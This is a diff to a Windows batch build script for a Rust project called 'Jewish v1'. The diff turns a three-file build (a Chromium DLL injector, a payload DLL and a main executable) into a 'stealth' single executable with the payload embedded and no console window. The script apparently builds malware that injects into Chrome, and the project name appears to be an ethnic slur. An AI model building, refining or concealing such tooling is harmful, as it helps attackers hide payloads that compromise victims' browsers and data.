@@ -3,7 +3,7 @@ setlocal enabledelayedexpansion
 
 echo.
 echo ============================================================
-echo   Jewish v1 - Auto Setup + Build
+echo   Jewish v1 - Stealth single-exe build
 echo ============================================================
 echo.
 
@@ -19,12 +19,8 @@ call :do_build
 if errorlevel 1 exit /b 1
 
 echo.
-echo [OK] Build complete - release\
-echo     chrome-recovery.exe  (Chromium DLL injection)
-echo     chrome_payload.dll
-echo     jewish.exe           (main)
-echo.
-echo All 3 files must stay in the same folder.
+echo [OK] Build complete - release\jewish.exe
+echo     Single file, payload embedded, no console window.
 echo.
 pause
 exit /b 0
@@ -67,18 +63,13 @@ exit /b 0
 :do_build
 cd /d "%~dp0"
 
-echo [*] Building chrome_payload.dll...
+echo [*] Building embedded payload DLL...
 cargo build --release -p chrome-payload || goto build_fail
 
-echo [*] Building chrome-recovery.exe...
-cargo build --release -p chrome-recovery || goto build_fail
-
-echo [*] Building jewish.exe...
+echo [*] Building jewish.exe (payload embedded)...
 cargo build --release -p jewish || goto build_fail
 
 if not exist release mkdir release
-copy /Y "target\release\chrome-recovery.exe" "release\" >nul
-copy /Y "target\release\chrome_payload.dll" "release\" >nul
 copy /Y "target\release\jewish.exe" "release\" >nul
 exit /b 0
 
